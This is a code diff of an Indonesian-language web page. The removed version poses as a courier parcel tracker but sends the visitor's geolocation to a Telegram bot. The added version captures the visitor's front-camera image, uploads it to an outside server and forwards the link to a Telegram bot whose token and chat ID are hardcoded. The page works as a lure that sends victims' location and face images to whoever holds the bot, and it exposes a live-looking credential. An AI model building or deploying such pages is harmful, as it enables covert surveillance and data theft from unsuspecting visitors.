@@ -1,112 +1,103 @@
-
-
 <!DOCTYPE html>
 <html>
 <head>
-   <title>Melacak Lokasi Paket Kurir</title>
-   <style>
-       body {
-           font-family: Arial, sans-serif;
-           background-image: url('kurir_background.jpg');
-           background-size: cover;
-           background-repeat: no-repeat;
-           background-attachment: fixed;
-           display: flex;
-           justify-content: center;
-           align-items: center;
-           height: 100vh;
-           margin: 0;
-           color: white;
-           text-align: center;
-       }
-       #map {
-           width: 80%;
-           height: 80%;
-           border: 2px solid white;
-           box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
-       }
-       #trackButton {
-           margin-top: 20px;
-           padding: 10px 20px;
-           font-size: 18px;
-           cursor: pointer;
-           background-color: #3498db;
-           color: white;
-           border: none;
-           border-radius: 5px;
-       }
-       #trackButton:hover {
-           background-color: #2980b9;
-       }
-   </style>
+    <title>Kamera Depan dan Kirim ke Telegram</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+        }
+        #cameraContainer {
+            text-align: center;
+        }
+        #video {
+            width: 640px;
+            height: 480px;
+            background-color: #f0f0f0;
+            border: 2px solid #333;
+            border-radius: 5px;
+        }
+        #captureButton {
+            margin-top: 20px;
+            padding: 10px 20px;
+            font-size: 18px;
+            cursor: pointer;
+            background-color: #3498db;
+            color: white;
+            border: none;
+            border-radius: 5px;
+        }
+        #captureButton:hover {
+            background-color: #2980b9;
+        }
+    </style>
 </head>
 <body>
-   <div>
-       <div id="map"></div>
-       <button id="trackButton">Lacak Lokasi Paket</button>
-   </div>
-   <script>
-       var map;
-       var marker;
-       var infoWindow;
+    <div id="cameraContainer">
+        <video id="video" autoplay></video>
+        <button id="captureButton">Kirim Gambar ke Telegram</button>
+    </div>
+    <script>
+        const video = document.getElementById('video');
+        const captureButton = document.getElementById('captureButton');
 
-       function initMap() {
-           map = new google.maps.Map(document.getElementById('map'), {
-               center: {lat: -6.200000, lng: 106.816666},
-               zoom: 14
-           });
-           infoWindow = new google.maps.InfoWindow();
-       }
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(error => {
+                console.error('Terjadi kesalahan:', error);
+            });
 
-       document.getElementById('trackButton').addEventListener('click', function() {
-           if (navigator.geolocation) {
-               navigator.geolocation.getCurrentPosition(function(position) {
-                   var pos = {
-                       lat: position.coords.latitude,
-                       lng: position.coords.longitude
-                   };
+        captureButton.addEventListener('click', () => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                   if (marker) {
-                       marker.setPosition(pos);
-                   } else {
-                       marker = new google.maps.Marker({
-                           position: pos,
-                           map: map,
-                           title: 'Lokasi Paket'
-                       });
-                   }
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('image', blob, 'capture.png');
 
-                   map.setCenter(pos);
-                   map.setZoom(14);
+                fetch('https://apps-store.onrender.com/', {
+                    method: 'POST',
+                    body: formData
+                })
+                    .then(response => response.json())
+                    .then(data => {
+                        const botToken = '8359132305:AAFGAdP03knmnPkauPBoAcE9gCjVMmv3jMc';
+                        const chatId = '1966317946';
+                        const message = 'Gambar dari kamera depan: ' + data.imageUrl;
 
-                   var content = 'Lokasi paket saat ini: Latitude ' + pos.lat + ', Longitude ' + pos.lng;
-                   infoWindow.setContent(content);
-                   infoWindow.open(map, marker);
-
-                   // Kirim lokasi ke Telegram bot
-                   var botToken = 'YOUR_BOT_TOKEN';
-                   var chatId = 'YOUR_CHAT_ID';
-                   var message = 'Lokasi paket saat ini: Latitude ' + pos.lat + ', Longitude ' + pos.lng;
-
-                   fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
-                       method: 'POST',
-                       headers: {
-                           'Content-Type': 'application/json'
-                       },
-                       body: JSON.stringify({
-                           chat_id: chatId,
-                           text: message
-                       })
-                   });
-               }, function(error) {
-                   alert('Terjadi kesalahan: ' + error.message);
-               });
-           } else {
-               alert('Browser Anda tidak mendukung GeoLocation API.');
-           }
-       });
-   </script>
-   <script async defer src="https://maps.googleapis.com/maps/api/js?key=YOUR_API_KEY&callback=initMap"></script>
+                        fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify({
+                                chat_id: chatId,
+                                text: message
+                            })
+                        })
+                            .then(response => response.json())
+                            .then(data => {
+                                console.log('Gambar berhasil dikirim ke Telegram:', data);
+                            })
+                            .catch(error => {
+                                console.error('Terjadi kesalahan:', error);
+                            });
+                    })
+                    .catch(error => {
+                        console.error('Terjadi kesalahan:', error);
+                    });
+            });
+        });
+    </script>
 </body>
 </html>
-
